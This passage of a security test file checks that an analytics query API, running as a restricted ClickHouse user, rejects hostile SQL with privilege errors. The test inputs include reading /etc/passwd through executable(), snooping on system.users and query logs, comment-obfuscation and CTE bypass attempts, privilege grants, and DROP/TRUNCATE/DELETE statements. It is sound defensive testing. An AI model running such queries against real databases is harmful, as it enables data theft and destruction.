        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow cluster table access", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM cluster('default', system.query_log)",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON REMOTE. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON REMOTE. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow multi-statement execution", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT 1; SELECT 1",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Syntax error (Multi-statements are not allowed): failed at position 9 (end of query) (line 1, col 9): ; SELECT 1 
            FORMAT JSONEachRow. . 
          \`,
        },
        "error": deindent\`
          Syntax error (Multi-statements are not allowed): failed at position 9 (end of query) (line 1, col 9): ; SELECT 1 
          FORMAT JSONEachRow. . 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow CTE to bypass restrictions", async ({ expect }) => {
  const response = await runQuery({
    query: "WITH secret AS (SELECT * FROM system.users) SELECT * FROM secret",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow accessing tables of other databases", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM analytics.some_table",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 60 Unknown table expression identifier 'analytics.some_table' in scope SELECT * FROM analytics.some_table. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 60 Unknown table expression identifier 'analytics.some_table' in scope SELECT * FROM analytics.some_table. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow accessing information_schema", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM information_schema.tables",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(table_catalog, table_schema, table_name, table_type, table_rows, data_length, index_length, table_collation, table_comment, TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE, TABLE_ROWS, DATA_LENGTH, TABLE_COLLATION, TABLE_COMMENT) ON information_schema.tables. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(table_catalog, table_schema, table_name, table_type, table_rows, data_length, index_length, table_collation, table_comment, TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE, TABLE_ROWS, DATA_LENGTH, TABLE_COLLATION, TABLE_COMMENT) ON information_schema.tables. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow dictionary access", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM system.dictionaries",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(database, name, uuid, status, origin, type, \\\`key.names\\\`, \\\`key.types\\\`, \\\`attribute.names\\\`, \\\`attribute.types\\\`, bytes_allocated, hierarchical_index_bytes_allocated, query_count, hit_rate, found_rate, element_count, load_factor, source, lifetime_min, lifetime_max, loading_start_time, last_successful_update_time, error_count, loading_duration, last_exception, comment) ON system.dictionaries. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(database, name, uuid, status, origin, type, \\\`key.names\\\`, \\\`key.types\\\`, \\\`attribute.names\\\`, \\\`attribute.types\\\`, bytes_allocated, hierarchical_index_bytes_allocated, query_count, hit_rate, found_rate, element_count, load_factor, source, lifetime_min, lifetime_max, loading_start_time, last_successful_update_time, error_count, loading_duration, last_exception, comment) ON system.dictionaries. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow query log snooping", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT query FROM system.query_log LIMIT 10",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(query) ON system.query_log. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(query) ON system.query_log. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow granting privileges", async ({ expect }) => {
  const response = await runQuery({
    query: "GRANT SELECT ON system.users TO limited_user",
  });

  // Syntax error as .query does not support GRANT statements
  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Syntax error: failed at position 47 (FORMAT) (line 2, col 1): FORMAT JSONEachRow. Expected one of: token, At, Comma, EXCEPT, ON, WITH GRANT OPTION, WITH ADMIN OPTION, WITH REPLACE OPTION, ParallelWithClause, PARALLEL WITH, end of query. " },
        "error": "Syntax error: failed at position 47 (FORMAT) (line 2, col 1): FORMAT JSONEachRow. Expected one of: token, At, Comma, EXCEPT, ON, WITH GRANT OPTION, WITH ADMIN OPTION, WITH REPLACE OPTION, ParallelWithClause, PARALLEL WITH, end of query. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("shows grants", async ({ expect }) => {
  const response = await runQuery({
    query: "SHOW GRANTS",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 200,
      "body": { "result": [{ "GRANTS FORMAT JSONEachRow": "GRANT SELECT ON default.events TO limited_user" }] },
      "headers": Headers { <some fields may have been hidden> },
    }
  `);
});

it("does not allow creating functions", async ({ expect }) => {
  const response = await runQuery({
    query: "CREATE FUNCTION plus_one AS (a) -> a + 1",
  });

  // will fail because we do .query; .query does not support CREATE FUNCTION
  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Syntax error: failed at position 43 (FORMAT) (line 2, col 1): FORMAT JSONEachRow. Expected one of: token, DoubleColon, OR, AND, IS NOT DISTINCT FROM, IS NULL, IS NOT NULL, BETWEEN, NOT BETWEEN, LIKE, ILIKE, NOT LIKE, NOT ILIKE, REGEXP, IN, NOT IN, GLOBAL IN, GLOBAL NOT IN, MOD, DIV, ParallelWithClause, PARALLEL WITH, end of query. " },
        "error": "Syntax error: failed at position 43 (FORMAT) (line 2, col 1): FORMAT JSONEachRow. Expected one of: token, DoubleColon, OR, AND, IS NOT DISTINCT FROM, IS NULL, IS NOT NULL, BETWEEN, NOT BETWEEN, LIKE, ILIKE, NOT LIKE, NOT ILIKE, REGEXP, IN, NOT IN, GLOBAL IN, GLOBAL NOT IN, MOD, DIV, ParallelWithClause, PARALLEL WITH, end of query. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow S3 access", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM s3('https://bucket.s3.amazonaws.com/data.csv')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON S3. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON S3. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow executable table function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM executable('cat /etc/passwd', 'TabSeparated', 'line String')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE TEMPORARY TABLE ON *.*. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE TEMPORARY TABLE ON *.*. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow comment obfuscation to bypass restrictions", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT /* system */ * FROM system.users",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow comment obfuscation in table names", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM system./**/users",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow creating materialized views", async ({ expect }) => {
  const response = await runQuery({
    query: "CREATE MATERIALIZED VIEW evil ENGINE = MergeTree ORDER BY x AS SELECT * FROM system.query_log",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE VIEW ON default.evil. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE VIEW ON default.evil. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow merge table function to access system tables", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM merge('system', '.*')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "There are no tables satisfied provided regexp, you must specify table structure manually. " },
        "error": "There are no tables satisfied provided regexp, you must specify table structure manually. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow DROP TABLE", async ({ expect }) => {
  const response = await runQuery({
    query: "DROP TABLE events",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant DROP VIEW ON default.events. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant DROP VIEW ON default.events. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow ALTER TABLE", async ({ expect }) => {
  const response = await runQuery({
    query: "ALTER TABLE events ADD COLUMN malicious String",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant ALTER ADD COLUMN(malicious) ON default.events. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant ALTER ADD COLUMN(malicious) ON default.events. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow TRUNCATE TABLE", async ({ expect }) => {
  const response = await runQuery({
    query: "TRUNCATE TABLE events",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant TRUNCATE ON default.events. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant TRUNCATE ON default.events. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow DELETE statements", async ({ expect }) => {
  const response = await runQuery({
    query: "ALTER TABLE events DELETE WHERE 1=1",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant ALTER DELETE ON default.events. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant ALTER DELETE ON default.events. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow UPDATE statements", async ({ expect }) => {
  const response = await runQuery({
    query: "ALTER TABLE events UPDATE project_id = 'hacked' WHERE 1=1",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant ALTER UPDATE(project_id) ON default.events. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant ALTER UPDATE(project_id) ON default.events. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow accessing system.users", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM system.users",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(name, id, storage, auth_type, auth_params, host_ip, host_names, host_names_regexp, host_names_like, default_roles_all, default_roles_list, default_roles_except, grantees_any, grantees_list, grantees_except, default_database) ON system.users. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});


it("does not allow accessing system.processes", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM system.processes",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(is_initial_query, user, query_id, address, port, initial_user, initial_query_id, initial_address, initial_port, interface, os_user, client_hostname, client_name, client_revision, client_version_major, client_version_minor, client_version_patch, http_method, http_user_agent, http_referer, forwarded_for, quota_key, distributed_depth, elapsed, is_cancelled, is_all_data_sent, read_rows, read_bytes, total_rows_approx, written_rows, written_bytes, memory_usage, peak_memory_usage, query, normalized_query_hash, query_kind, thread_ids, ProfileEvents, Settings, current_database) ON system.processes. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant SELECT(is_initial_query, user, query_id, address, port, initial_user, initial_query_id, initial_address, initial_port, interface, os_user, client_hostname, client_name, client_revision, client_version_major, client_version_minor, client_version_patch, http_method, http_user_agent, http_referer, forwarded_for, quota_key, distributed_depth, elapsed, is_cancelled, is_all_data_sent, read_rows, read_bytes, total_rows_approx, written_rows, written_bytes, memory_usage, peak_memory_usage, query, normalized_query_hash, query_kind, thread_ids, ProfileEvents, Settings, current_database) ON system.processes. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow input() function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM input('x String')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE TEMPORARY TABLE ON *.*. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant CREATE TEMPORARY TABLE ON *.*. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow numbers table function with large values", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM numbers(1000000000)",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": { "error": "Limit for result exceeded, max rows: 10.00 thousand, current rows: 65.41 thousand. " },
        "error": "Limit for result exceeded, max rows: 10.00 thousand, current rows: 65.41 thousand. ",
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow jdbc table function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM jdbc('jdbc:mysql://localhost:3306/db', 'table')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON JDBC. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON JDBC. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow mysql table function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM mysql('localhost:3306', 'database', 'table', 'user', 'password')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON MYSQL. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON MYSQL. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});

it("does not allow postgresql table function", async ({ expect }) => {
  const response = await runQuery({
    query: "SELECT * FROM postgresql('localhost:5432', 'database', 'table', 'user', 'password')",
  });

  expect(stripQueryId(response, expect)).toMatchInlineSnapshot(`
    NiceResponse {
      "status": 400,
      "body": {
        "code": "ANALYTICS_QUERY_ERROR",
        "details": {
          "error": deindent\`
            Error during execution of this query.
            
            As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON POSTGRES. 
          \`,
        },
        "error": deindent\`
          Error during execution of this query.
          
          As you are in development mode, you can see the full error: 497 limited_user: Not enough privileges. To execute this query, it's necessary to have the grant READ ON POSTGRES. 
        \`,
      },
      "headers": Headers {
        "x-stack-known-error": "ANALYTICS_QUERY_ERROR",
        <some fields may have been hidden>,
      },
    }
  `);
});
